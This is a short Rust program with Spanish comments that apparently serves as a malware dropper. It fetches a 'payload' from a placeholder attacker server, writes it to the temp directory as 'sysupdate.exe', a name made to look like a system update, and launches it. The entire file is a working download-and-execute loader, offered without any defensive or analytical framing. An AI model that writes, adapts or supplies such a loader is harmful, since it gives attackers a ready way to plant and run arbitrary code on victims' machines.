use std::fs::File;
use std::io::Write;
use std::process::Command;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    // 1. Descargar el payload
    let url = "http://tu-servidor.com:8080/payload";
    let response = reqwest::blocking::get(url)?;
    let bytes = response.bytes()?;

    // 2. Guardar en temp
    let path = std::env::temp_dir().join("sysupdate.exe");
    let mut file = File::create(&path)?;
    file.write_all(&bytes)?;

    // 3. Ejecutar
    Command::new(path).spawn()?;

    Ok(())
}
